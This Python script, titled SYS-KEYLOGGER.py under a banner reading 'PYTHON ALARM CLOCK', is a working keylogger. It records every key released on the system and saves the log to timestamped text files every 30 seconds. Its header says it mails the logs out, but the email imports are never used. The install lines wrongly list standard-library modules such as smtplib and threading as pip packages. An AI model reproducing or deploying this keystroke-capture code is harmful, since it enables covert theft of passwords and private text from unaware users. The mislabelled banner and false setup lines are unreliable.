#-- !/usr/bin/env python3
#-- -*- coding: utf-8 -*-
#--
#-- ************************************************************************************************************:
#-- ******************************************** PYTHON ALARM CLOCK ********************************************:
#-- ************************************************************************************************************:
#-- Author:   JBallard (JEB)                                                                                    :
#-- Date:     2024.4.18                                                                                         :
#-- Script:   SYS-KEYLOGGER.py                                                                                  :
#-- Purpose:  A Python script that logs a systems keyboard actions distributes it to an email wrapper.          :
#-- Class:    python -m pip install keyboard                                                                    :
#-- Class:    python -m pip install smtplib                                                                     :
#-- Class:    python -m pip install Timer                                                                       :
#-- Class:    python -m pip install threading                                                                   :
#-- Class:    python -m pip install MIMEMultipart                                                               :
#-- Class:    python -m pip install MIMEText                                                                    :
#-- Version:  1.0                                                                                               :
#-- ************************************************************************************************************:
#-- ************************************************************************************************************:
#--
#-- ********************************************************:
#-- DEFINE PARAMS, CONSTANTS, CONFIG PATHS, CLASSES, & LIBS :
#-- ********************************************************:
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
#--
#-- PARAMS - DISTRIBUTE KEYLOGGER REPORT INTERVAL:
SEND_REPORT_EVERY = 30
#--
#-- CLASS - KEYLOGGER:
class Keylogger:
    #-- 
    #-- FUNCTION - REPORTING WRAPPER:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    #--
    #-- FUNCTION - KEYLOGGER:
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    #--
    #-- FUNCTION - FILENAME:
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    #--
    #-- FUNCTION - GENERATE LOG FILE:
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    #--
    #-- FUNCTION - REPORT:
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    #--
    #-- FUNCTION - REPORT:
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"NOTE - {datetime.now()} - STARTED KEYLOGGER PROCESS:")
        keyboard.wait()
#--
#-- SEND KEYLOGGER REPORT:
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
#--
#-- ********************************************************:
#-- END OF PYTHON SCRIPT                                    :
#-- ********************************************************:
